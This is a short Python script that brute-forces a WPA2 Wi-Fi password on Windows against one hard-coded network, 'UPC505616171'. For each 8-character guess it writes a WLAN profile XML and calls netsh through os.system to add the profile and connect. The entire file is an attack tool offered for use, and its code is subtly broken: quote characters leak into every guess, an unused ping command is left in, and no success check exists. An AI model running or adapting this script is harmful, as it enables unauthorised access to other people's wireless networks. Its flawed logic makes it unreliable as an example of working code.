# import module
import os
import itertools
# function to establish a new connection
def createNewConnection(name, SSID, password):
    config = """<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>""" + name + """</name>
    <SSIDConfig>
        <SSID>
            <name>""" + SSID + """</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>""" + password + """</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    command = "netsh wlan add profile filename=\"" + name + ".xml\"" + " interface=Wi-Fi"
    with open(name + ".xml", 'w') as file:
        file.write(config)
    os.system(command)


# function to connect to a network
def connect(name, SSID):
    print("connecting", name, SSID)
    command = "netsh wlan connect name=\"" + name + "\" ssid=\"" + SSID + "\" interface=Wi-Fi"
    os.system(command)


# function to display avavilabe Wifi networks
def displayAvailableNetworks():
    command = "netsh wlan show networks interface=Wi-Fi"
    os.system(command)


def brute_force():
    input("Click enter to continue")
    command = "ping www.google.com"
    displayAvailableNetworks()
    my_length = 8
    possibles = ['\\', '`', '~', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '+', '=', '[', ']', '{', '}', '|', ';', ':', "'", '"', '?', '.', '>', ',', '<', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    i = 0
    for attempt in itertools.product(possibles, repeat=my_length):
        i = i + 1
        string = str(attempt)
        output = string.replace(", ", "")
        final_output = output.replace("(","").replace(")","")
        str_final_output = str(final_output)
        #print(i, str_final_output)
        #### Edit createnewconnection and connect...
        print('Commencing brute force on "UPC505616171"',str_final_output)
        createNewConnection("UPC505616171","UPC505616171",str_final_output)
        connect("UPC505616171", "UPC505616171")
print("Le wifi brute force - slow af ")
brute_force()